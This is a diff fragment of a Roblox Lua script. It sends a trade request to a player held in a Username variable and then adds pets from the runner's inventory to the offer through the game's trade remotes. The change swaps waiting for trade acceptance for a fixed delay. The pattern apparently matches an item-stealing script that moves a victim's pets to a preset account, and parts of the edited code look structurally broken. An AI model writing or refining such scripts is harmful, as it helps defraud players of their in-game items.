@@ -100,11 +100,10 @@ local function SendTrade()
   local Loads = require(game.ReplicatedStorage.Fsys).load
   local RouterClient = Loads("RouterClient")
   local send_trade = RouterClient.get("TradeAPI/SendTradeRequest")
+
         send_trade:FireServer(game.Players[Username])
-end
-  local TradeAccepted = RouterClient.get("TradeAPI/TradeAccepted")
-        TradeAccepted.OnClientEvent:Connect(function()
-wait(3)
+
+wait(5)
   local Loads = require(game.ReplicatedStorage.Fsys).load
   local RouterClient = Loads("RouterClient")
   local AddPetRemote = RouterClient.get("TradeAPI/AddItemToOffer")
@@ -127,7 +126,7 @@ wait(3)
   else
     print("No pets found in inventory.")
   end
-end)
+end
 
 local total_pets = 0
 for i, v in pairs(ClientData.get("inventory").pets) do
